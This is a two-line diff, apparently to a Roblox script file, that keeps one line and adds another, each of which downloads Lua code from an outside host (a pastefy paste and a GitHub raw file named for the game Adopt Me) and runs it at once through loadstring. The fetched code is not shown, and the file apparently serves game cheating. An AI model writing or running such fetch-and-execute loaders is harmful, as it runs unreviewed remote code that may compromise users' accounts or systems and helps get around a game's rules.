@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://pastefy.app/9rjl3mc2/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KeplerRBLX/AdoptMe/refs/heads/main/AdoptMe.lua%20(1).txt"))()
